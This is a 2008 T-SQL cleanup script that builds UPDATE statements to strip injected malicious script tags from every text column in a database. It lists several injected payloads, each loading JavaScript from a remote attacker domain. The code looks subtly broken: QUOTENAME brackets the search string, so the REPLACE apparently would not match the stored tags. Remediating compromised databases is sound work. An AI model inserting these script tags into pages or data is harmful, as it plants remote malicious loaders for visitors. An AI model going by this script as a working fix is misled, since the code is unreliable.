------------------------------------------------------------\n-- Name: STRING REPLACER\n-- Author: ADUGGLEBY\n-- Version: 20.05.2008 (1.2)\n--\n-- Description: Runs through all available tables in current\n-- databases and replaces strings in text columns.\n------------------------------------------------------------\n\n-- PREPARE\nSET NOCOUNT ON\n\n-- VARIABLES\nDECLARE @tblName NVARCHAR(150)\nDECLARE @colName NVARCHAR(150)\nDECLARE @tblID int\nDECLARE @first bit\nDECLARE @lookFor nvarchar(250)\nDECLARE @replaceWith nvarchar(250)\n\n-- CHANGE PARAMETERS\n--SET @lookFor =  QUOTENAME('"&gt;&lt;/title&gt;&lt;script src="http://www0.douhunqn.cn/csrss/w.js"&gt;&lt;/script&gt;&lt;!--')\n--SET @lookFor =  QUOTENAME('&lt;script src=http://www.banner82.com/b.js&gt;&lt;/script&gt;')\n--SET @lookFor =  QUOTENAME('&lt;script src=http://www.adw95.com/b.js&gt;&lt;/script&gt;')\nSET @lookFor =  QUOTENAME('&lt;script src=http://www.script46.com/b.js&gt;&lt;/script&gt;')\nSET @replaceWith = ''\n\n-- TEXT VALUE DATA TYPES\nDECLARE @supportedTypes TABLE ( xtype NVARCHAR(20) )\nINSERT INTO @supportedTypes SELECT XTYPE FROM SYSTYPES WHERE NAME IN ('varchar','char','nvarchar','nchar','xml', 'text')\n\n-- ALL USER TABLES\nDECLARE cur_tables CURSOR FOR \nSELECT SO.name, SO.id FROM SYSOBJECTS SO WHERE XTYPE='U'\nOPEN cur_tables\nFETCH NEXT FROM cur_tables INTO @tblName, @tblID\n\nWHILE @@FETCH_STATUS = 0\nBEGIN\n    -------------------------------------------------------------------------------------------\n    -- START INNER LOOP - All text columns, generate statement\n    -------------------------------------------------------------------------------------------\n    DECLARE @temp VARCHAR(max)\n    DECLARE @count INT\n    SELECT @count = COUNT(name) FROM SYSCOLUMNS WHERE ID = @tblID AND \n        XTYPE IN (SELECT xtype FROM @supportedTypes)\n\n    IF @count > 0\n    BEGIN\n        -- fetch supported columns for table\n        DECLARE cur_columns CURSOR FOR \n            SELECT name FROM SYSCOLUMNS WHERE ID = @tblID AND \n                XTYPE IN (SELECT xtype FROM @supportedTypes)\n        OPEN cur_columns\n        FETCH NEXT FROM cur_columns INTO @colName\n\n        -- generate opening UPDATE cmd\n        SET @temp = '\n    PRINT ''Replacing ' + @tblName + '''\n\n    UPDATE ' + @tblName + ' SET \n        '\n        SET @first = 1\n\n        -- loop through columns and create replaces\n        WHILE @@FETCH_STATUS = 0\n        BEGIN\n            IF (@first=0) SET @temp = @temp  + ',\n            '\n            SET @temp = @temp  + @colName\n            SET @temp  = @temp  + ' = REPLACE(' +  @colName + ',''' \n            SET @temp  = @temp  + @lookFor \n            SET @temp  = @temp  + ''',''' \n            SET @temp  = @temp  + @replaceWith\n            SET @temp  = @temp  +  ''')'\n\n            SET @first = 0\n\n            FETCH NEXT FROM cur_columns INTO @colName\n        END\n\n        PRINT @temp\n\n        CLOSE cur_columns\n        DEALLOCATE cur_columns\n    END\n    ------------------------------------------------------------------------------------------- \n    -- END INNER\n    -------------------------------------------------------------------------------------------\n\n    FETCH NEXT FROM cur_tables INTO @tblName, @tblID\nEND\n\nCLOSE cur_tables\nDEALLOCATE cur_tables